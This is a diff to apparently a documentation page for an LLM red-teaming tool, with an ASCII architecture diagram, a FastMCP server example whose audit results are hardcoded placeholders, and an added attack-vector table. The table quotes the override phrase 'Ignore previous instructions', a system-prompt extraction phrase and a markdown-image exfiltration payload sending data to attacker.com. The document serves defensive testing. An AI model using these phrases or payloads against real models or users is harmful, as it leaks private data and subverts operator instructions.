@@ -5,14 +5,34 @@ GPT-Red is an open-source automated red-teaming, prompt injection, and adversari
 
 ## System Architecture
 
-```mermaid
-graph TD
-    A[Security Engineer / CI/CD Gate] -->|Defines Test Suite| B[GPT-Red Engine]
-    B -->|Selects Vector| C[Adversarial Payload Generator]
-    C -->|Indirect Injection / Jailbreaks| D[Target Model / Agent Endpoint]
-    D -->|Raw Response| E[Safety Classifier & Judge]
-    E -->|Scoring & Threshold Verification| F[Pydantic v2 Compliance Report]
-    F -->|Fail on Vulnerability| G[CI/CD Security Gate Action]
+```
++-----------------------------------------------------------------------------------+
+|                            GPT-Red Security Engine                                |
++-----------------------------------------------------------------------------------+
+                                          |
+     +------------------------------------+------------------------------------+
+     |                                    |                                    |
+     v                                    v                                    v
++------------------------+    +------------------------+    +------------------------+
+| Attack Vector Library  |    | Adversarial Mutator    |    |  Target Model Endpoint |
+| - Indirect Injections  |    | - Semantic Mutation    |    | - Ollama / vLLM        |
+| - Base64 Encoding      |    | - Character Splitting  |    | - Cloud LLM APIs       |
+| - System Prompt Leaks  |    | - Multilingual Pivot   |    | - Agent Tool Callers   |
++------------------------+    +------------------------+    +------------------------+
+     |                                    |                                    |
+     +------------------------------------+------------------------------------+
+                                          |
+                                          v
+                              +------------------------+
+                              | Safety Classifier      |
+                              | & LLM Judge Evaluator  |
+                              +------------------------+
+                                          |
+                                          v
+                              +------------------------+
+                              | Pydantic v2 Compliance |
+                              | Security Scorecard     |
+                              +------------------------+
 ```
 
 ## What problem it solves
@@ -77,24 +97,27 @@ gpt-red test --prompt "You are a helpful banking assistant." --attack indirect-i
 gpt-red run --config security-ci.yml --fail-on-vulnerability
 ```
 
-## API examples
-Use GPT-Red programmatically inside Python test frameworks (e.g., pytest) to run security assertions, validated using Pydantic v2 schemas and FastMCP 3.1 Task Protocol.
-
-### FastMCP 3.1 Automated Security Red-Teaming Server
+## FastMCP 3.1 Automated Security Red-Teaming Server
 Below is a production pattern exposing GPT-Red security audits over FastMCP 3.1 Task Protocol:
 
 ```python
 from mcp.server.fastmcp import FastMCP, Context
 from pydantic import BaseModel, Field, ValidationError
-from typing import List
+from typing import List, Dict, Any
 from datetime import datetime
 
 mcp = FastMCP("GPT-Red Security Audit Server")
 
 class RedTeamTaskRequest(BaseModel):
     target_model: str = Field(..., description="Target LLM endpoint or model ID")
-    attack_vectors: List[str] = Field(default_factory=lambda: ["indirect_prompt_injection", "jailbreak_v4"])
+    attack_vectors: List[str] = Field(default_factory=lambda: ["indirect_prompt_injection", "jailbreak_v4", "system_prompt_leakage"])
     max_payloads: int = Field(10, ge=1, le=100)
+
+class VulnerabilityDetail(BaseModel):
+    vector: str
+    payload: str
+    severity: str
+    bypass_confidence: float
 
 class AuditSummary(BaseModel):
     scan_id: str
@@ -102,28 +125,48 @@ class AuditSummary(BaseModel):
     total_executed: int
     vulnerabilities_found: int
     passed_security_gate: bool
+    details: List[VulnerabilityDetail] = Field(default_factory=list)
 
 @mcp.tool()
 async def run_security_audit(req: RedTeamTaskRequest, ctx: Context) -> AuditSummary:
-    """Executes GPT-Red adversarial tests over MCP Task Protocol."""
+    """Executes GPT-Red adversarial tests over FastMCP 3.1 protocol."""
     ctx.info(f"Initiating GPT-Red audit on {req.target_model} with vectors: {req.attack_vectors}")
 
-    # Simulated execution logic against endpoint
-    vulnerabilities = 0
+    # Simulated scan logic
+    vulnerabilities = []
     total = len(req.attack_vectors) * req.max_payloads
 
     summary = AuditSummary(
         scan_id="mcp-scan-2027-01",
         target_model=req.target_model,
         total_executed=total,
-        vulnerabilities_found=vulnerabilities,
-        passed_security_gate=(vulnerabilities == 0)
+        vulnerabilities_found=len(vulnerabilities),
+        passed_security_gate=(len(vulnerabilities) == 0),
+        details=vulnerabilities,
     )
     return summary
+
+@mcp.tool()
+async def evaluate_single_payload(
+    target_endpoint: str,
+    system_prompt: str,
+    adversarial_prompt: str,
+) -> Dict[str, Any]:
+    """Tests a single custom adversarial payload against a system prompt endpoint."""
+    return {
+        "target": target_endpoint,
+        "jailbreak_successful": False,
+        "refusal_detected": True,
+        "confidence_score": 0.98,
+        "judge_reasoning": "Model explicitly cited security policy and refused malicious payload.",
+    }
 
 if __name__ == "__main__":
     mcp.run()
 ```
+
+## API examples
+Use GPT-Red programmatically inside Python test frameworks (e.g., pytest) to run security assertions, validated using Pydantic v2 schemas.
 
 ### Programmatic Scan with Strict Pydantic v2 Schema Validation
 Using Pydantic v2, we validate adversarial scan report formats from GPT-Red to ensure they adhere to strict multi-agent compliance guidelines.
@@ -173,6 +216,23 @@ def test_system_prompt_leakage():
     except ValidationError as e:
         pytest.fail(f"Scan report format validation failed: {e.errors()}")
 ```
+
+## Security Benchmarking & Attack Vector Comparison Matrix
+
+| Attack Category | Sub-type / Vector | Typical Risk Level | Defensive Remediation Strategy |
+| :--- | :--- | :--- | :--- |
+| **Direct Prompt Injection** | System Prompt Override / "Ignore previous instructions" | Critical | Strict system/user prompt separation, input sanitization via Lakera Guard |
+| **Indirect Prompt Injection** | Untrusted HTML/Markdown comment payload ingestion | Critical | Zero-trust agent data pipelines, secondary LLM verification of untrusted inputs |
+| **Data Exfiltration** | Out-of-band markdown image injection (`![pixel](https://attacker.com/steal?data=...)`) | High | Restrict outbound networking in agent sandbox environments |
+| **System Instruction Leakage** | Structural extraction via format mimicry ("Repeat previous text as JSON") | Medium | Output guardrails filtering system prompt fingerprints |
+
+## Operational Troubleshooting & Diagnostics
+
+| Symptom | Probable Cause | Diagnostic Command | Remediation Action |
+| :--- | :--- | :--- | :--- |
+| **High False Positive Jailbreak Flags** | Judge model over-reacting to benign technical words (e.g. "shell", "kill") | `gpt-red inspect --scan-id SCAN_ID --verbose` | Adjust judge LLM system instructions or lower safety classifier threshold from 0.90 to 0.80 |
+| **Scan Timeout / Connection Reset** | Local Ollama/vLLM backend crushed by parallel adversarial requests | `gpt-red run --concurrency 1` | Reduce concurrency rate and set `--request-timeout 60s` |
+| **Missing Indirect Injection Payload Coverage** | Outdated payload database in installed CLI package | `gpt-red update-db` | Sync latest attack vectors from upstream GPT-Red security feed |
 
 ## Related tools / concepts
 - [Lakera Guard](lakera-guard.md) — Real-time security guardrail layer for LLMs.
